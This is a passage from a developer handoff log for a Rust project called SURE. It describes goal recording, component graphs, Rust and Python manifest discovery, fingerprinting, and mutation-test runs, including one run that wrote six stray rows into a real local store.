`crates/sure-core/tests/project_intent_ingest.rs`, `crates/sure-cli/src/check.rs`,
and the two new `Report` variants that the CLI needed to answer with. The
documentation is `docs/architecture/PROJECT_INTENT.md` (rewritten from a stub
whose sections were all still in the imperative) and a new section in
`docs/architecture/CLI.md`.

The acceptance is one sentence: *"`sure check` can receive/store a trusted
explicit goal without requiring raw transcript recording."* It has three
separable claims, and each is answered in a different place:

- **receive** — `explicit_goal(&str)` turns the text into one `Requirement` with
  the fixed identifier `goal`. The text is stored **verbatim**: not trimmed, not
  re-wrapped, not cut at the first full stop. The emptiness test trims, because
  `--goal "   "` has no words in it however it was spelled; the stored value does
  not, because trimming is already an edit.
- **trusted** — the source is `IntentSource::ExplicitUserGoal`, one of the only
  two `is_user_requirement` accepts, and `raw_retained` is true because the words
  are the user's own rather than a summary of them.
- **without requiring raw transcript recording** — nothing consults
  `requires_full_recording`, and
  `storing_a_goal_writes_no_recording` asserts the *absence* of a recording row
  through `HistoryFilter::recordings()`. That is the half a test asserting "a row
  appeared" would miss.

`crates/sure-cli/src/check.rs` is where the run happens, and three decisions in
it are the ones worth knowing about:

1. **A bare `sure check` is unchanged.** `--goal` absent means "check the
   project", which this build cannot do, so it still returns the same `NotYet` at
   status 3 and still touches nothing. Adding the flag turned no existing command
   line into a different answer.
2. **Recording a goal is `Report::GoalRecorded`, not a `NotYet`** — a new result
   shape, at status 3. The check did not happen, but the user's history changed,
   and a refusal that said only "not implemented in this build" would be true
   about the check and false about the run. Status 3 stops the script; the frame
   carries the record. Reporting 0 here would make `sure check` a green light in
   CI while checking nothing, which is the failure this program exists to find.
3. **A run that tried and could not finish is `Report::Failed` at status 5**, not
   3. The remedy for 3 is a newer build; the remedy for 5 is to look at the
   machine. `outcome`'s closed set in `docs/architecture/CLI.md` grew to include
   `failed`.

The goal is bound to a **real** project fingerprint — `project_fingerprint` with
default options — and the report leads with the kind and the digest rather than
with the identifier, because `FingerprintId` is minted per run. The consequence
for a reader is written down in `PROJECT_INTENT.md`: find the goal by project
root and kind, not by fingerprint.

### Two things `P2-T010` could not test, both recorded rather than papered over

**The happy path is not covered as a process.** `cli_contract.rs` runs the
binary, and it runs `sure check --goal ""` and nothing more: a goal *with words*
would be written to the store the developer's own machine really uses, and on
Windows that location comes from `SHGetKnownFolderPath`, which ignores
`LOCALAPPDATA` — so no environment variable can point a test at a scratch
directory. A test that did it would put an invented requirement into somebody's
history and look exactly like a green one. The code under that path is driven by
`src/check.rs`'s unit tests against locations they name, and by
`sure-core/tests/project_intent_ingest.rs`. `docs/architecture/CLI.md` states the
gap in those words.

**One code path's defence cannot be observed at all.** The early return in
`check::run` — "a bare `sure check` does not look for its files" — is a promise
about a machine where SURE has *no* data directory. Removable, the answer a user
gets is identical and the difference is a store created on a machine that did not
have one. No test in this repository can see it, for the same reason as above.
It is the second mutation in `mutate12.py`'s declared-unobservable set, and it
closes the same day a caller can choose where SURE keeps its files.

### The mutation run wrote six rows into the real store, and that is the same gap seen from the other side

**The gap above is not only a missing test. It has a cost, and this run paid it.**
`cli_contract.rs` runs the real `sure.exe` against the real locations, which on
Windows means the developer's actual `%LOCALAPPDATA%\SURE\sure.db`. In the
unmutated build that is harmless, because the only goal it passes is `--goal ""`
and an empty goal is refused before the store is opened. **The mutation that
deletes that refusal therefore does not merely fail a test — it writes into
somebody's history.** It did:

| id | kind | document | project_root |
|---|---|---|---|
| 1, 2, 3, 4, 5, 6 | `project-intent` | `{"id":"goal","raw_retained":true,"source":"explicit_user_goal","text":""}` | `C:\Users\lishi\code\SURE\crates\sure-cli` |

Six rows, in three pairs a few hundred milliseconds apart, all inside a
254-second window (`1789403446` – `1789403700`, ms since epoch). `text` is empty
in every one — a shape no shipped code path can produce, which is what identifies
them as the mutation's rather than a user's.

**Two things were measured rather than assumed, and the second is the one that
matters:**

- **An unmutated suite run leaves the store byte-identical.** Taken around a
  single `cargo test -p sure-cli --test cli_contract`: 6 rows before, 6 rows
  after, the same SHA-256 over the row contents, and the same MD5 over the file.
  So the shipped tests do not pollute it, and the claim in `docs/architecture/CLI.md`
  about the gap is accurate as written.
- **The file's hash is not a before/after comparison across sessions.** The hash
  recorded in the previous session's handoff was compared against the hash today
  and differed — and that comparison was meaningless, because it straddled a
  migration and six writes. This is the second time this file has had to say that
  a hash taken at two different times is not a measurement; the pairing has to be
  taken around one command.

**The rows are left in place, and removing them is the owner's call.** They are
false records in a history file that has no backup, and deleting them is not
reversible; the exact statement is
`delete from records where id in (1,2,3,4,5,6)` against that database, which the
owner may run or not. Leaving them also keeps the evidence, which is why the
default here is to leave them. **The durable fix is the one already named: the day
a caller can choose where SURE keeps its files, this test stops being able to
touch the real store at all** — and until then, any mutation that removes the
empty-goal refusal will do this again, which is worth knowing before the next
mutation run rather than after it.

### Two things `P2-T010` observed and did not fix

Neither is a defect claim; both are things the next reader will meet.

1. **`FingerprintId` is minted per call while `Evidence::is_fresh_for` compares
   ids.** `ProjectFingerprint::git` and `::content` call `FingerprintId::generate`
   every time, so an unchanged project gets a different identifier on every run,
   while `sure_domain::evidence::Evidence::is_fresh_for(current)` asks whether two
   *identifiers* are equal. If that predicate is ever the thing that decides
   whether stored evidence is stale, it will answer "not fresh" for evidence
   about a project nobody touched — the failure mode `choose.rs` and
   `FINGERPRINTING.md` both argue against. Nothing calls it with a real
   fingerprint id yet, so this is a question to answer rather than a bug to fix:
   **is a fingerprint id meant to be stable across runs, or is `kind` + `digest`
   the identity and the id only names one computation?** `P2-T010` assumed the
   second and reports `kind` and `digest`, keeping the id to the machine frame.
   `docs/architecture/PROJECT_INTENT.md` records the same assumption.
2. **`HistoryFilter` has no `project_root` filter.**
   `sure_core::store::HistoryFilter` filters by project fingerprint and by record
   kind, and a goal is stored against a project *root*. So a reader asking a
   shared user-level store for one project's goal must fetch by kind and filter
   by root itself. Nothing in this build reads a goal back at the user level —
   `sure check --goal` only writes — so the gap is recorded rather than worked
   around, and the task that first reads one owns closing it.

### The `P2-T010` mutation run, and the two holes it found

`target/tmp/mutate12.py` (git-ignored), 23 mutations over three files: **21 of
21 observable mutations caught by a failing test, 2 declared unobservable and
missed as declared, 0 skipped, 0 that failed to compile.**

The families are the three claims above plus the one about what a run *says*, and
the third is where the value was. Eleven mutations are false-green shapes —
`sure check --goal` reporting `ok`, exiting 0, filing a recorded goal as an
answer about the project, reporting a summary of the goal as the goal itself.
Each fails three tests at once, which is the point: the exit status, the outcome
word and the human sentence are three independent renderings of one decision and
the suite holds all three.

Two mutations came back green on the first run, and both tests were written
afterwards:

- **"the goal is summarized into one sentence before it is stored"** —
  `Requirement::text` is documented as *"normalized to one sentence where
  possible"*, so cutting at the first full stop is the most plausible way to get
  the no-summarizing rule wrong. Every goal in the test had no full stop in it, so
  the mutation changed nothing. A user writing a goal writes several sentences
  when it takes several to say what they want — which is exactly when losing the
  rest matters most. Two multi-sentence goals are in the test now.
- **"the store is opened before SURE knows whether it has anything to write"** —
  and the reason it was green is the more useful finding.
  `a_project_that_cannot_be_read_leaves_no_store_behind` used a **relative** root,
  and `Store::open` refuses a relative root through `Paths::ensure_outside` as
  well, so the module that opened the store first passed the very test written to
  catch it. The test now also uses an absolute path that does not exist — the
  ordinary mistake of a mistyped path — which only the fingerprinter refuses.

The third rule of the harness earned its place twice: one mutation was reported
`SKIP` because its anchor did not match (the formatter had reflowed the line), and
one was reported `BUILD` because it made a `match` non-exhaustive. Neither
counted as a catch, which is what those verdicts are for — a mutation that was
never applied, or that stopped the code compiling, says nothing about whether a
test would have noticed the behaviour.

**A fourth thing this run did was not a test result at all.** The whitespace
mutation — the first in the list, and the one whose anchor is the refusal this
module exists to state — made the process-level test in `cli_contract.rs` write
six empty-text rows into the developer's real store, because that test runs the
real binary against the real locations. **The mutation harness has a side effect
outside the repository, and nothing in this file said so before.** The rows, the
reason, the measurement showing the unmutated suite is clean, and the one-line
statement that removes them are in "The mutation run wrote six rows into the real
store" above. Worth knowing before the next mutation run rather than after it.

## What `P2-T007` added

`crates/sure-core/src/components.rs` (a module of `sure-core`, beside `discover`)
and `crates/sure-core/tests/components_graph.rs`, plus
`docs/architecture/COMPONENT_GRAPH.md`.

`ComponentGraph::of(&Discovery)` is a **view** — it opens no file, and
`the_component_graph_opens_no_file_and_starts_no_process` enforces that against
the source rather than trusting the module comment that says it. It produces a
list of components (the root, then every directory a workspace declaration
named), the containment edges between them, and one `EcosystemResolution` per
ecosystem.

The task's second acceptance criterion — *"unknown stack details remain
inference"* — is carried by the type rather than by a convention:

- `Component::manifests` holds **one `ComponentManifest` per ecosystem**, never a
  merged verdict. Node and Rust can name the same directory, one may have read a
  manifest there and the other not, and a single field would have to pick — losing
  a fact silently in one direction or the other. Keeping both removes the merge
  decision rather than guarding it, and `Component::stack()` is a derivation over
  the list.
- `Stack` is `Read` / `Partial` / `Unknown`, with **no `Option` anywhere**. There
  is no shape a caller can render as "no stack", and no plain value it can render
  as a fact.
- `ManifestReading` has five arms because discovery established five different
  things. The pair most easily collapsed by accident is `NotOpened` (*there is a
  `package.json` SURE did not open*) versus `NoManifest` (*there is nothing
  there*); collapsing them tells a reader either that a file is missing when it
  is not, or that a file was read when it was not.
- `Members` has a `NotRead` arm that **must not be rendered as "no members"**,
  and `Members::is_known_single()` is the single question a report asks before
  saying "one component". It returns `false` for `NotRead`.

Three things worth knowing before touching it:

1. **`NotRead` is returned for every Python project.** `python.rs` reads no
   member list at all — `[tool.uv.workspace]` and `[tool.pdm.workspace]` are not
   parsed — so SURE cannot tell a one-package Python project from a fifty-package
   one. This is gap 8 of `docs/architecture/ECOSYSTEM_DISCOVERY.md`, and the
   component graph is where it would otherwise become a false claim. A Python
   monorepo therefore reports as **one component with a caveat**, and the caveat
   is in `plain_description` so a caller that never reads `resolution` still
   cannot lose it.
2. **`contains` is not a dependency graph.** `"@app/ui": "workspace:*"` is a
   request to a resolver SURE has not run. Only containment (a fact about paths)
   and declaration (a fact about files read, carrying its `Source`) are here.
3. **A Rust member that `exclude` names is still a component.** Discovery reports
   those in `Workspaces::excluded_members` and deliberately does not subtract
   them; the graph inherits that and offers no way to see which they are. That is
   recorded as gap 1 in `COMPONENT_GRAPH.md`.

The order of `components` is `Path`'s own order — component by component, so the
root is first. An earlier draft sorted by depth and then by path, and the depth
key was removed rather than tested: every fixture was one level deep, so the
mechanism was doing nothing any test could see.

## What `P2-T006` added

`crates/sure-core/src/discover/rust.rs` (2885 lines, 30 unit tests) and
`crates/sure-core/tests/discover_rust.rs` (24 tests, the new 21st test binary),
plus `crates/sure-core/src/discover/pattern.rs` — the member-pattern expansion
lifted out of `node.rs` so two ecosystems cannot come to expand a `*` two ways.
`discover/mod.rs` gained `Ecosystem::Rust` and `Findings::Rust`, and
`MemberManifest` moved up so both Node and Rust name one type; `node.rs` keeps a
re-export so `node::MemberManifest` still names what it always named.
`docs/architecture/ECOSYSTEM_DISCOVERY.md` gained a Rust half, its enforced-by
rows and five new gaps (11–15).

**The one fact the module is arranged around: `[package]` and `[workspace]` are
sibling tables of one document and either can be absent.** A `Cargo.toml` with
only `[workspace]` is a *virtual manifest*, and it declares the members, their
shared dependencies and their shared lint levels. So the workspace tables are held
on `Manifest` and **not** on `PackageSection`, and `Manifest` is a separate type
for exactly that reason. Hanging them off the package would drop a virtual
manifest's entire workspace — the case such a manifest exists for. This was the
first draft's bug, it was designed out rather than discovered, and mutation 24
reverts it and is caught. A third fact is kept apart from both: `[dependencies]`
is meaningful only where `[package]` exists, because Cargo refuses a virtual
manifest that declares dependencies.

**The same split decides the commands, and this is the second designed-out bug.**
`command_for` gates on `project.manifest.manifest()?` — the *document* — and
deliberately not on `package()`. Gating on the package would withhold every
command from a workspace root, which is a project `cargo build` acts on and
builds every member of. Mutation 23 deletes the gate and is caught.

The rest, briefly:

- **`exclude` is not subtracted from `members`.** Whether a directory named by
  both is a member is Cargo's rule and SURE has not read it, so
  `Workspaces::excluded_members` carries the overlap and neither list is applied.
  Reporting it is reversible by a reader who knows the rule; silently honouring it
  would be SURE asserting a rule it cannot cite.
- **The toolchain pin is read by the file's name, not by what parsed.**
  `rust-toolchain.toml` holds a `[toolchain]` table; the bare `rust-toolchain` is
  not TOML and usually holds one token. A `.toml` that carries no `[toolchain]`
  table is `WrongShape`, a `.toml` that does not parse is `NotParsed`, and only a
  file that is not TOML falls through to the bare-channel reading. This is the one
  place a filename changes an answer, and the doc says so.
- **Seven conventional targets**, reported as what is *at* the path and never as
  what the file contains. `build.rs` is the one to pause on: Cargo compiles and
  executes it before the crate, which makes it the only file in a Rust project
  that runs arbitrary code at build time. It is reported as a `BuildScript` target
  and nothing here executes or reads it. `src/lib.rs` is reported and never read —
  this is the one place the module leans on a Cargo convention rather than on a
  declaration, and it is gap 11.
- **`Requirement` is four facts, not an `Option`.** `Stated`, `FromWorkspace`,
  `Unstated`, `NotReadable` — `foo = { workspace = true }` is not a version in
  this file, and a spec SURE cannot read is not a dependency that is not there.
- **`grade` is the single place a level and a reason are decided together**, and
  `is_absent()` is true only for the `Absent` arm, so the one question a caller
  may collapse is the one that collapses to false for a file that is there but
  unread.
- **One `Budget` serves all three ecosystems**, and the same one is shared:
  `discover()` builds one and passes it to `node::look`, then `python::look`, then
  `rust::look` in `Ecosystem::ALL` order. A Node-heavy project starves both later
  ecosystems by call order and not by anything their modules do. Recorded in the
  doc under "What is bounded" and now **measured rather than asserted**: with
  `max_manifests(1)` the affected files are exactly two, `pyproject.toml` and
  `Cargo.toml`.

### What the second `P2-T006` commit added, and the two ways its own tests were wrong

Commit `9c931d0` was green and its run was read, and `P2-T006` was **not** accepted
on the strength of it. A background security review flagged
`crates/sure-core/src/discover/pattern.rs`, the module P2-T006 had just lifted out
of `node.rs`. Reading it independently found the containment rule sound — no
traversal, no filesystem reach, no unbounded expansion — and found the real,
actionable gap underneath: **`pattern.rs` had no tests at all**, at 209 lines and
9 tests' worth of behaviour, and it is the one module in the tree where a
*project's own text* decides which directories SURE then reads. The same rule was
reachable through three callers, so it was checked three ways and stated nowhere.

Nine tests were added, plus a fourth family of mutations (28–34) anchored on
`pattern.rs`, because a test that no mutation can break is a test this repository
does not count. The rows the new tests pin went into the doc's enforced-by table,
and the index was re-checked mechanically: **88 backticked identifiers, 87 of them
`#[test]` functions and one a deliberately named function, 0 found nowhere.**

**The first version of those tests turned the suite red, and the mutation run is
what said so.** The scratch helper used the process id to make its directory
unique — the idiom this file had been told to use — and
`discovery_runs_none_of_the_scripts_it_reads` greps the *text* of all six files in
the module tree for the process module's name. It reads `#[cfg(test)]` code too.
The test was failing before any mutation was applied, which means **every
`CAUGHT` in that run was unattributable** — a mutation cannot be credited with a
failure that was already there. Had the suite been run only as
`cargo test --lib discover::pattern`, which is what a person checking their own
work would run, all nine tests would have passed and the branch would have been
pushed red.

The fix is in the test and not in the check, because the check was right about the
file. Uniqueness now comes from `create_dir` failing rather than from a name:
`AlreadyExists` means try the next number. That is strictly stronger than the
pid — the pid is unique within one run and says **nothing** across two, so a name
built from it collides with a previous run's directory when the OS hands out the
same id, and the test then reads a fixture some earlier run had already written
into. `create_dir` refuses to adopt a directory that exists, so a stale path is
skipped whatever else is running.

**And it then turned red a second time, on the sentence explaining the fix.** The
sentinel searches raw text, so the doc comment saying "no `std::process` here,
deliberately" tripped the very check it was describing. A **mention is not an
ability**: the test now drops whole-line comments before searching, so only lines
that can hold code are read. Only whole-line comments — a trailing comment on a
line of code is still searched — and the change is documented at the check, since
the alternative was a trap that would fire on the next author who wrote a sentence
about the rule.

Neither of these was found by reading the diff. Both were found by running
something that was expected to pass.

### Two things `P2-T006` found and fixed rather than recorded

**A real gap between `P2-T005` and `P2-T006`.** The "discovery must not start a
process" source grep in `discover_node.rs` named only Node's three files
(`discover/mod.rs`, `discover/node.rs`, `discover/read.rs`). `python.rs` therefore
went unchecked for a whole task, and `rust.rs` would have gone unchecked after
this one. It now names all six files in the module tree, with a comment saying
why: the claim is about **discovery**, and a check that named one ecosystem's
files would have let the next one shell out unnoticed.

**Two tests named in the enforced-by table that do not exist.**
`a_project_that_is_every_ecosystem_at_once_is_reported_as_all_of_them` (the real
name says `a_directory_that_is…`) and
`a_workspace_inherited_dependency_is_read_as_one_that_states_a_version_here`
(invented outright, replaced with the real
`a_dependency_sure_cannot_read_is_not_a_dependency_that_is_not_there`). The check
was mechanical rather than by eye: extract every backticked identifier from the
table and require `fn <name>` to exist in the corpus. It now reports **79 names,
0 missing**. A documented index that names a nonexistent test is worse than no
index — a reader who trusts it believes a property is pinned when it is not.

## What `P2-T005` added

Python discovery, as a second module beside the Node one. Five files carry it:
`crates/sure-core/src/discover/python.rs` (2863 lines, 25 module unit tests),
`crates/sure-core/tests/discover_python.rs` (31 tests, the new **20th** test
binary), `mod.rs` (`Ecosystem::Python`, `Findings::Python`, the wiring),
`read.rs` (`read_text_file`, and `to_json` for the TOML conversion), and
`scan/ignore.rs` (`.tox`, `.nox` and `.eggs` as vendored). `toml` moved from a
test-support dependency of `sure-core` to a real one, which the workspace
manifest explains: it is deliberately **not** deserialized straight into
`serde_json::Value`, because `toml` represents a datetime as
`{"$__toml_private_datetime": ...}` — a table the project did not write, under a
key that looks like project data — and `inf`/`nan` as `null`.

**The rule is the same one `node.rs` is built on: not there is never
there-but-unreadable.** `ManifestState`, `ReadFile` and `UnreadReason` are enums
and never `Option`s, and `read_manifest` pairs the reader with the converter so a
shape failure cannot reach the state without reaching `Discovery::unread`.

**Two facts about this module are load-bearing and easy to get wrong.**

*One `Budget` serves both ecosystems.* `discover()` builds one and hands it to
`node::look` and then to `python::look`, in `Ecosystem::ALL` order. A project
with 512 Node manifests therefore leaves nothing for Python, and its
`pyproject.toml` is `OutOfBudget` rather than read. That is the intended reading
of a limit on how many manifests SURE reads in one discovery, but it is a
consequence of the call order and not of anything Python's module does. It is
written down in `ECOSYSTEM_DISCOVERY.md` rather than left to be discovered.

*`setup.py` is a program, so it is never read.* It declares its dependencies by
executing Python, so it is `unread_legacy` — a name carried through to the
result — and a project whose only manifest is a `setup.py` gets `InspectOnly`,
which says exactly that. `discovery_runs_nothing` writes a `setup.py` and a
`conftest.py` that would each leave a file behind if executed **or imported**,
runs discovery, and requires that no such file appears; it also lists the
directory, so the assertion is not only about the two names it could think of.

**A requirements file is the weakest evidence and is never a disagreement on its
own.** pip, uv, poetry and pdm all read `requirements.txt`, so a `uv.lock` beside
one is the ordinary shape of a project that moved to uv. Reported as a
contradiction it would be a false alarm, and a false alarm beside a real one is
how a reader learns to ignore both. It is still collected and still reported, as
the third tier, where it decides only when nothing stronger is present.

**Requirement names are parsed and two rejections stop a name being invented.**
A name immediately followed by `:` or `/` is not a name, which is what stops
`https://example.invalid/pkg-1.0.whl` being read as a dependency called `https`;
and a run ending in a non-alphanumeric is not a name, because `foo-` and `foo.`
are prefixes. Every line of a requirements file lands in `requirements`,
`directives` or `comments`, and a test asserts the three add up to the file's
line count.

**The mutation run found one real hole in a suite that was already green.**
Changing the support level of the "recognised, but nothing SURE reads declares
anything" arm from `InspectOnly` to `Generic` passed every test — so a project
SURE had read nothing from (a bare `uv.lock`, or a bare `.python-version`) was
being reported as a project SURE fully understands. That is the false-green
direction, and
`a_project_with_no_manifest_sure_can_read_is_not_called_fully_understood` closes
it and asserts the reason carries no project text. `target/tmp/mutate9.py`
applies **23** mutations, **22 caught** — the figures are from a re-run at the
end of this session, and the count written here first was 22 and 21, wrong by one
both times, see the mutation section — and the one that is not caught is recorded
in the script with its reason and the verdict is right: it is the same standing
as `FINGERPRINTING.md` gap 8.

**Two things this work falsified, fixed rather than left.**
`a_directory_with_no_node_files_in_it_is_not_a_node_project` asserted the exact
list of ecosystems, which broke the moment Python was added: it was a fact about
the build that the test had no business pinning, and it now asserts
`Ecosystem::ALL` plus that Node is one of them. And the previous handoff claimed
`crates/sure-testkit/tests/repository_shape.rs` pins a dependency's category —
**that is false**, and the correction is written into the "Next concrete action"
entry where the claim was made.

## What `P2-T004` added, and the defect its verification turned up

`crates/sure-core/src/discover/` is new: `mod.rs` (the ecosystem-agnostic shell
and `discover()`), `read.rs` (one reader for one file, and the reasons a file can
be unread), and `node.rs` (everything Node-specific). 33 integration tests in
`tests/discover_node.rs` — the new **19th** test binary — 24 unit tests in the
module, and one doc test. That is +58, and the workspace total went **668 → 726**
with the arithmetic closing exactly. `docs/architecture/ECOSYSTEM_DISCOVERY.md`
is the authority; `P2-T004`'s acceptance note carries the summary.

**The rule the task is built on: the four questions a manifest can be asked are
answered with an enum, never with an `Option`.** A manifest that is not there, a
manifest that is there and could not be read, and a manifest that was read are
three different worlds, and `None` collapses the last two into "no
dependencies" — a package whose manifest could not be read would be reported as
a package with nothing in it. So `ReadFile` is `Absent`/`Parsed`/`Unread`,
`ManifestState` is `Read`/`Absent`/`Unread`, `MemberManifest` is
`Present`/`Absent`/`NotReadable`, and `UnreadReason` names all seven ways a file
reaches the third state rather than one. `read.rs` is the only place that decides
which, and that is what makes the rule structural rather than a convention: a
caller that wants to confuse the two states now has to write the confusion out
loud, in a match arm, where a reviewer can see it.

**The package manager is not "the one with a lockfile".** Four managers are
recognised — npm, yarn, pnpm, bun — and each can be evidenced three ways of
different strength: a `packageManager` declaration, a lockfile, and an `engines`
range. `Managers::agreed()` returns the one manager every source points at, and
`None` when they disagree. Two lockfiles, or a declaration that contradicts the
lockfile beside it, are reported as a `Disagreement` rather than resolved by a
precedence rule the reader cannot see. A manager SURE does not recognise is not
reported as one it does.

**Workspaces are resolved against the directories that are really there.** The
root is never a member of its own workspace. A pattern that would reach outside
the project is refused; a pattern that names nothing is reported as naming
nothing, because the alternative is a workspace list that silently covers less
than it claims; and a list that was cut short says so. `packages/*` expands one
level, and each component in turn; a pattern relying on brace expansion or
character classes — which npm does not support either — is reported as
`UnsupportedPattern` rather than approximated.

**Scripts.** 8 conventional roles, each looked up across the spellings projects
actually use, and `command_for(manager, role)` renders the command the declared
manager needs, so the report never proposes `npm run` for a pnpm project. A
script that is present and has no command does not read as a script that is
absent — the same distinction as the manifest, one level down.

**Frameworks and tooling are one 67-row table across 11 roles.** The package
name stored in a `Tooling` always comes from the table and never from the
manifest, so a project cannot get a role by naming itself something. Two rows
carry `@biomejs/biome` — it is a linter and a formatter, and one dependency holds
both roles — which is why `tooling_of_role` returns an iterator rather than one
entry.

**`discovery_runs_none_of_the_scripts_it_reads`.** This module executes nothing.
That is the property the module is shaped around rather than a promise added
afterwards, and it is the same line `FINGERPRINTING.md` and `EXECUTION_SAFETY.md`
draw.

### The mutation run, and the one hole it found

`target/tmp/mutate8.py` applies **27 mutations; 27 were caught.** Two are
deliberately not in the script and it records why: a tool-name substitution is
not expressible, because `collect_tooling` only pushes when the name already
matches, and the tooling sort is not observable from a single run. Three anchors
had to be made more specific after the first run — one had matched two identical
probes (`if matches!(tree.probe(…), Probe::File(_))` at the lockfile and at the
typescript config, in the same shape), one removing a `seen.insert` left the
binding unused and so did not compile, and one was a no-op.

**The hole it found was in a suite that was already green.** `Package::dependencies_not_ranges`
— the field that keeps *declares `left-pad: ^1.3.0`* and *declares `jest: [29]`*
from reading alike — had **no test anywhere**. The mutation that deletes it was
MISSED, which is what surfaced it. Two tests close it, and the second is the one
that matters: a name declared with no range in **two** sections must be named
**once**, which is what makes the `dedup()` beside the `sort()` load-bearing
rather than decorative. This is the latest of several times on this branch that a
mutation found something no test reached — `P2-T001` found two, `P2-T003` found a
test that was reaching the wrong branch. It is the cheapest way to find one, and
it keeps being worth running.

### What `P2-T004` does not establish

The five gaps `ECOSYSTEM_DISCOVERY.md` records, none of them closed by this task:
the byte budget has only been exercised where the manifest itself crossed it (the
`+ 1` read that catches a file growing *during* the read has never been seen to
fire); `Unreadable` is reached by a missing path and by an interior NUL, never by
a file the OS refuses to let this user read; the two spellings `package.json` and
`Package.json` in one project is constructible only on a case-sensitive
filesystem, so the Linux and macOS jobs are where it would run; workspace pattern
expansion is one component at a time and brace expansion is reported as
`UnsupportedPattern` rather than approximated; and the link-at-the-manifest case
is a **directory** link, because `mklink /J` needs no privilege here and a file
symbolic link does, so the file-link arm is one code path by argument rather than
by test. **CI has now run on `P2-T004` and falsified something outside this
list** — not one of these five gaps but a claim that there were no
platform-dependent surfaces at all. See "Reading run `34850549120`" below, which
also records that the `#[cfg(unix)]` arms of this task remain uncompiled and
unrun here.

## The defect `P2-T004`'s verification found: five scratch paths every run reused

Found while chasing a suite that failed roughly one run in eight, always in a
different test, always clean on a re-run. It is fixed in `0a577ca` and it is the
reason that commit exists separately.

**What was wrong.** Five test helpers cleared a scratch directory with
`let _ = std::fs::remove_dir_all(&path)` and then used the path as though it were
empty. On Windows that deletion can fail — the previous run's database is still
open — and the discarded error turned the clear into a wish. The test then read
somebody else's records as its own.

**The instance that is proven, and the proof.** `tests/store_concurrency.rs`
reported **200 records where 100 had been written**, and reported a lost write.
Both reports were wrong: the file had never been cleared, so the count was the
old run's rows added to the new ones, and the "lost" write had been there all
along. Established by holding a handle open across the clear and
watching it happen deterministically, not by argument. **The wrong number is the
point** — the suite did not merely fail to see the truth, it stated the opposite
of it, which is the kind of report this repository treats as worse than an error.

**The four that are not proven.** All five helpers now name their scratch
directory after `std::process::id()` — the convention `config/authority.rs`,
`config/mod.rs` and `discover_node.rs` already followed — and all five keep a
loud backstop for the case where the id has been reused. But **only the first is
shown to be that fault**, and the comments in the other four say so:

- `crates/sure-core/src/store/mod.rs`'s test module — the same shape as the one
  above, in the store's own unit tests, not separately reproduced.
- `crates/sure-core/src/doctor.rs` — seen to fail under a loaded run with
  `the store was readable: NotCreated` and `Unreadable` with `os error 5`, and
  those stopped once the path was unique; **that is not proof the path caused
  them**.
- `crates/sure-core/tests/doctor.rs` — this one fails about **once in ten
  whole-workspace runs and never once in twelve runs of its binary alone**. The
  only code in the repository that deletes that path is `scratch` itself.
  Removing a shared resource is not the same as repairing a proven fault, and the
  comment in the file says exactly that.
- `crates/sure-testkit/tests/integration_thinness.rs` — failed with
  `Os { code: 3, kind: NotFound }` on a write into a directory `create_dir_all`
  had just made. **The obvious explanation did not survive a probe**: 3000 rounds
  of that exact shape — fixed name, create, write, remove, repeat — failed zero
  times, and 3000 with a unique name also failed zero times. So the pending-delete
  story is falsified as far as this machine can falsify it, and the comment says
  the cause is not known rather than naming one.

**One fix was tried and abandoned, and it is worth recording.** The first attempt
kept the fixed path and made the failed clear loud instead of silent. Failures
went from ~5–9 per ten runs to **9–18**: with the clear now fatal, a hidden lock
made the test stop instead of quietly reading stale data. Making the symptom
louder without removing the shared resource made the suite worse. Uniqueness is
the substantive fix; the backstop is only there for the case uniqueness cannot
cover.

**Gates for the fix and for `P2-T004` together:** `cargo fmt --all -- --check`
clean; `cargo clippy --workspace --all-targets -- -D warnings` clean;
`cargo test --workspace` **726 passed, 0 failed, 1 ignored** across 19 test
binaries and 4 doc-test targets; `node scripts/taskctl.mjs validate` = 166 tasks;
`pwsh scripts/Preflight-Windows.ps1` passed. The flake evidence is
**16 consecutive piped workspace runs with 0 failures**, under the exact pipeline
that failed 8 of 8 before the change — recorded as `n` runs clean, not as "fixed",
because a flake that has stopped appearing has not thereby been explained.

## What `P2-T003` added, and the false green it found in its own tests

The non-Git fingerprint, and — the part that is a decision rather than an
implementation — **which of the two kinds a project gets.** Three new modules and
an extraction, in `7ce90bf`:

- `content.rs` — the manifest. It walks with `crate::scan`, the same tables and
  the same comparison the checks use, so "generated and vendor churn is excluded"
  is one rule and not a second list that can drift from the first.
  `the_excluded_list_is_the_scans_and_not_a_second_copy_of_it` pins the agreement
  rather than the list. Every limit — `max_depth`, `max_entries`, `max_files`,
  `max_bytes` — is an error and never a digest over the part that fitted.
- `choose.rs` — the one place the kind is decided, so that the decision is a
  sentence somebody wrote rather than an accident of which function a caller
  reached for.
- `read.rs` — `Reader`, `Contents`, `file_kind` and `display_path`, moved out of
  `git/mod.rs` unchanged. Two implementations of "what is at this path" would be
  two answers to a question that has one, and the way they would diverge is not
  symmetric. Verified behaviour-preserving by the Git kind's tests, which did not
  change.
- `tests/fingerprint_content.rs` — 23 tests (25 on Unix; two are `#[cfg(unix)]`),
  plus one lib test in each of `choose.rs` and `content.rs`.
- `docs/architecture/FINGERPRINTING.md` — a content-fingerprint section, the
  dispatch rule and its table, and **gap 8**.

### The dispatch rule, and why the obvious one is wrong

**A project is fingerprinted by Git when it is at the root of the working tree
that contains it; otherwise by content.** `git rev-parse --show-prefix` is empty
exactly then.

"Is this directory inside a repository?" is the check anyone would write first,
and it answers *yes* for a directory one component deep in somebody else's
checkout. The Git kind digests `HEAD` on purpose, so for a subdirectory that is
exactly backwards: **a commit anywhere else in the repository moves `HEAD`, so
the subdirectory's fingerprint moves although not one of its files changed.**
Evidence marked stale over and over for a project nobody touched is how a person
learns to stop reading the word "stale".

That is not argued, it is measured, in both directions, by
`the_git_kind_moves_for_a_commit_the_project_is_not_part_of_and_the_content_kind_does_not`
— which also asserts that the Git kind *does* still move, so the reason cannot
quietly become folklore that outlives its truth.

**`GitUnavailable` stays an error and is deliberately not a fallback to content.**
The kind a project gets has to be a function of the project and not of the
machine. Falling back would mean one unchanged directory produced a `Git`
fingerprint on a laptop and a `Content` fingerprint on an agent without Git;
`ProjectFingerprint::matches` compares the kind, so every stored result would be
stale on the other machine and a project checked in both places would never agree
with itself. A caller who wants the content manifest anyway calls
`content_fingerprint` directly, which is the escape hatch and is explicit on
purpose.

`choose.rs`'s module test is the only test in the repository that can reach that
branch: the other three outcomes are decided by the *project* and a fixture can
build each, but this one is decided by the *machine* and needs a Git that is not
installed. `fingerprint_with` is `pub(crate)` for that reason, so the test lives
in the module rather than beside the other chooser tests.

### A false green this task found in its own tests

**The test named `a_project_in_no_repository_at_all_is_fingerprinted_by_content`
